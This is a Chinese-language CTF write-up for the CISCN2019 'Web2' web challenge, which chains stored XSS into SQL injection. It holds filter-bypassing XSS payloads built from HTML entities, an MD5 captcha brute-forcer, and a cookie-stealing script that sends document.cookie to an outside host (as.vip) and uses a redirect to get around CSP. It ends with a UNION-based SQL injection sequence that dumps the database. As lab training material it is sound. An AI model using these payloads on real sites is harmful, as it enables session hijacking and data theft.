# \[CISCN2019 华东北赛区]Web2

## \[CISCN2019 华东北赛区]Web2

## 考点

* xss
* sql注入

## wp

登录注册，有个投稿和反馈的功能。

投稿输入

```javascript
<img src="ssssss.png" onerror="javascript:alert(1)" /> 
```

得到文章页面，访问发现存在过滤

```javascript
<img waf等于号”ssssss.png”="" onerror等于号”javascript:alert（1）”="">
```

反馈处有提示`请输入有问题的网址。我会亲自查看`，应该是个XSS，在投稿插入XSS语句，在反馈处让bot访问XSS页面窃取cookie

反馈处的验证要求验证码md5的前6位符合要求，爆破脚本如下

```python
import hashlib

for i in range(1, 10000001):
    s = hashlib.md5(str(i).encode()).hexdigest()[0:6]
    if s == "0fc428":
        print(i)
        break
```

接下来是如何绕过XSS的过滤。测试发现会把`英文的单双引号，英文的括号`换成`中文`的，然后`<,>svg,eval,script`都没过滤。可以尝试HTML实体编码绕过，`'`是`&#x27;`，`"`是`&#x22;`，`(`是`&#x28;`，`)`是`&#x29;`，=是`&#x3D;`

如下payload可以弹窗

```
<svg><script>alert&#x28;1&#x29;</script></svg>
<svg><script>eval&#x28;atob&#x28;&#x27;YWxlcnQoMSk&#x3D;&#x27;&#x29;&#x29;</script></svg>
<svg><script>&#x65;&#x76;&#x61;&#x6c;&#x28;&#x61;&#x74;&#x6f;&#x62;&#x28;&#x27;&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;&#x27;&#x29;&#x29;</script></svg>
```

编码脚本

```python
res = ''
s="eval(atob('YWxlcnQoMSk='))"
for i in s:
    res = res + '&#' +hex(ord(i))[1:] + ';'
```

发现有CSP，可以使用跳转绕过

* `default-src 'self'` 所有的外部资源只能从当前域名加载
* `script-src unsafe-inline` 允许执行页面内嵌的标签和事件监听函数
* `script-src unsafe-eval` 允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数

![](<../.gitbook/assets/image (2) (1).png>)

到XSS平台新建个项目，然后访问script脚本，得到代码

```javascript
(function() { (new Image()).src = 'https://as.vip/bdstatic.com/?callback=jsonp&id=nRaT&location=' + encodeURIComponent((function() {
        try {
            return document.location.href
        } catch(e) {
            return ''
        }
    })()) + '&toplocation=' + encodeURIComponent((function() {
        try {
            return top.location.href
        } catch(e) {
            return ''
        }
    })()) + '&cookie=' + encodeURIComponent((function() {
        try {
            return document.cookie
        } catch(e) {
            return ''
        }
    })()) + '&opener=' + encodeURIComponent((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href: ''
        } catch(e) {
            return ''
        }
    })());
})();
```

然后把(new Image()).src改成window.location.href，结果如下

```javascript
(function() { window.location.href = 'https://as.vip/bdstatic.com/?callback=jsonp&id=nRaT&location=' + encodeURIComponent((function() {
        try {
            return document.location.href
        } catch(e) {
            return ''
        }
    })()) + '&toplocation=' + encodeURIComponent((function() {
        try {
            return top.location.href
        } catch(e) {
            return ''
        }
    })()) + '&cookie=' + encodeURIComponent((function() {
        try {
            return document.cookie
        } catch(e) {
            return ''
        }
    })()) + '&opener=' + encodeURIComponent((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href: ''
        } catch(e) {
            return ''
        }
    })());
})();
```

用脚本生成一下payload，在XSS平台可以看到自己的cookie

```python
s = '''(function(){window.location.href='https://as.vip/bdstatic.com/?callback=jsonp&id=nRaT&location='+encodeURIComponent((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+encodeURIComponent((function(){try{returntop.location.href}catch(e){return ''}})())+'&cookie='+encodeURIComponent((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+encodeURIComponent((function(){try{return (window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})()'''
output = ""

for i in s:
    output += "&#" + hex(ord(i))[1:] + ";"

print("<svg><script>eval&#x28;&#x22;" + output + "&#x22;&#x29;</script></svg>")
```

<mark style="color:red;">然后到反馈里面填链接如下</mark>

```
http://web.node3.buuoj.cn:81/post/8933fc518918c6156409c3c2fe884a5f.html
```

![](<../.gitbook/assets/image (11) (1) (1) (1) (1).png>)

修改cookie再去访问admin.php，发现是个查询的功能

![](<../.gitbook/assets/image (28) (1) (1).png>)

尝试SQL注入，输入`id=3-1`，得到`id=2`的结果，是数字型注入

然后尝试联合注入`id=-1 union select 1,2,3`

当前数据库`id=-1 union select 1,(select database()),3` 得到`ciscn`

查询所有数据库`id=-1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3`

得到`information_schema,ctftraining,mysql,performance_schema,test,ciscn`

当前数据库的表`id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ciscn'),3`

得到`flag,users`

查询flag表`id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag'),3`

得到`flagg`

查询flag `id=-1 union select 1,(select flagg from flag),3`

可以得到flag

![](<../.gitbook/assets/image (14) (1).png>)

## 小结

1. XSS绕过的方式可以用HTML实体转义，有两种方式`&#x十六进制;`和`&#十进制;`
2. CSP绕过可以尝试`window.location.href`跳转的方式

